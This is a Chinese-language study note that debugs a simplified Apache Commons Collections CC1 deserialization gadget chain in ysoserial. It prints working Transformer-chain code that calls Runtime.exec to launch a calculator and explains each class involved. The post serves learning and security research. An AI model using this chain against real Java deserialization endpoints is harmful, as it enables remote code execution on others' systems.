# **0x00** 前言

本文主要参考了

- [Phith0n师傅的Java安全漫谈系列](https://govuln.com/docs/java-things/)

第一节是Phith0n师傅简化的一个CC1链的debug分析。

# 0x01 CC1链简化版分析

上一篇文章中，debug跟踪分析了ysoserial URLDNS链。本节将对Phith0n在小密圈分享的CC1链进行一个分析和学习。这里，为了方便调用，我们在该路径`ysoserial-master/src/main/java/ysoserial/payloads/CC1.java`下建立CC1.java文件，内容如下：

```java
package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.getRuntime()),
            new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, transformerChain, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

这样，可以点击绿色箭头直接debug分析。如下图![](./images/2021_08_05_CC1链分析与学习_1.png)

按照上图下好断点后，我们开始debug分析。

## 方法分析

对CC1 gadget涉及到的类文件和方法进行一个简单的分析。

**Transformer接口**

Transformer.java是一个接口文件，它只有一个待实现的方法：

```java
public interface Transformer {
    public Object transform(Object input);
}
```

并且该类被很多类实现。



**ConstantTransformer类**

该类实现了Transformer接口。

1. 其构造函数将传入参数赋值给this.iConstant变量；

```java
public ConstantTransformer(Object constantToReturn) {
    this.iConstant = constantToReturn;
}
```

2. transform方法将返回this.iConstant变量。

```java
public Object transform(Object input) {
    return this.iConstant;
}
```

如果程序存在一个参数需要ConstantTransformer类的实例化变量，且之后又调用了其transform函数，我们就可以利用构造函数的参数constantToReturn传递任意指定Object对象（披着羊皮的狼）



**InvokerTransformer类**

该类实现了Transformer接口。

1. 其构造函数只进行简单的赋值操作;

```java
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
```

该构造函数与transform方法息息相关，需要三个参数。

2. 该类实现的transform方法可执行任意方法，也是反序列化执行命令的关键。

```java
public Object transform(Object input) {
    if (input == null) {
        return null;
    } else {
      try {
            Class cls = input.getClass();
        		Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
            return method.invoke(input, this.iArgs);
             ...
             ...
```

transform将解析构造参数传入的三个参数，执行input对象的iMethodName方法。

**ChainedTransformer类**

该类实现了Transformer接口。

1. 将传入参数赋值给iTransformers。注意，其类型为Transformer[]，是一个接口类型数组。

   ```java
   public ChainedTransformer(Transformer[] transformers) {
     super();
     iTransformers = transformers;
   }
   ```

2. transform方法会逐个遍历执行接口类型数组变量iTransformers数据的transformer方法，并将前一个执行的transform方法返回的结果作为接续执行的transform方法的输入。借用Phith0n师傅的图![](./images/2021_08_05_CC1链分析与学习_2.png)源码如下:

   ```java
   public Object transform(Object object) {
     for (int i = 0; i < iTransformers.length; i++) {
       object = iTransformers[i].transform(object);
     }
     return object;
   }
   ```

**TransformedMap类**

TransformedMap用于对Java标准数据结构Map做一个修饰，被修饰过的Map在添加新的元素时，将可以执行一个回调。

- 构造函数TransformedMap是protected，需要使用decorate方法调用

  ```java
  public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
      return new TransformedMap(map, keyTransformer, valueTransformer);
  }
  
  protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
      super(map);
      this.keyTransformer = keyTransformer;
      this.valueTransformer = valueTransformer;
  }
  ```

- put方法，是修饰过后的map对象添加新元素的方法。将会调用decorate方法传入的参数处理key和value。

  ```java
  public Object put(Object key, Object value) {
      key = this.transformKey(key);
      value = this.transformValue(value);
      return this.getMap().put(key, value);
  }
  ```

## 过程分析

主函数代码：

```java
public static void main(String[] args) throws Exception {
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.getRuntime()),
        new InvokerTransformer("exec", new Class[]{String.class},
        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
};
Transformer transformerChain = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
outerMap.put("test", "xxxx");
}
```

第1行 main函数

第2行 定义了一个接口类型数组`Transformer[]{}`，它有两个数据。

第3行 Transformer[]数组的第一个数据：ConstantTransformer类的实例化对象。后续过程中将调用其transform方法，return这里传入的`Runtime.getRuntime()`

第4-5行 Transformer[]数组的第二个数据：InvokerTransformer类的实例化对象，接收并保存三个参数（恶意命令）。后续过程中将调用其transform方法，并传入第一个数据的transform方法的返回结果`Runtime,getRuntime()`，执行恶意命令。

第7行 实例化对象ChainedTransformer，传入数组transformers。

第8行 实例化HashMap对象。

第9行 执行TransformedMap.decorate方法->构造方法。传入Map对象innerMap和进行数据修饰的对象transformerChain。

第10行 添加新元素。1-9行执行的代码都是为这一步做准备，是触发命令执行的关键代码。调用链如下：![](./images/2021_08_05_CC1链分析与学习_3.png)

ChainedTransformer类的transform方法遍历执行iTransformers(Transformer接口数组)内数据的transform方法。首先执行ConstantTransformer的transform方法：![](./images/2021_08_05_CC1链分析与学习_5.png)可以看到，传入数据值为`test`，也正如上文对ConstantTransformer类的分析，transform方法返回了`Runtime`对象。接续执行InvokerTransfomer类的transform方法。![](./images/2021_08_05_CC1链分析与学习_6.png)输入为ConstantTransformer的transform方法返回的**Runtime对象**，并利用反射在61行处执行命令。结果如下：![](./images/2021_08_05_CC1链分析与学习_7.png)

提一句，由于在 

```java
Map outerMap = TransformedMap.decorate(innerMap, transformerChain, transformerChain);
```

中对于key和value的修饰方法均设置为transformerChain，所以完整运行会执行两次命令。

# 